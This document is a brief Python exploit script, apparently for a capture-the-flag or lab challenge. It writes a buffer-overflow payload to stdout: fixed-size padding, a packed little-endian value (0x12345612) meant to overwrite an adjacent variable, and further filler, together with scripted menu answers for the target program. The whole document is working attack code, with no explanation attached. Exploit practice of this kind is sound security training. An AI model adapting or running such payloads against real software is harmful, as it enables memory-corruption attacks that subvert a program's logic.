from struct import pack
import sys

BUF_A_SIZE = 20
BUF_B_SIZE = 8
BUF_C_SIZE = 32
BUF_D_SIZE = 32

VAL_OVERWRITE = 0x12345612

p  = b"1" * BUF_A_SIZE
p += pack("<I", VAL_OVERWRITE)
p += b"1" * BUF_B_SIZE
p += b"2" * BUF_C_SIZE
p += b"1" * BUF_D_SIZE
p += b"\n"

sys.stdout.buffer.write(b"YH\nName\nxaq7pj\nY\nMotto\n")
sys.stdout.buffer.write(p)
sys.stdout.buffer.write(b"Y\n")
sys.stdout.buffer.write(b"done\n")
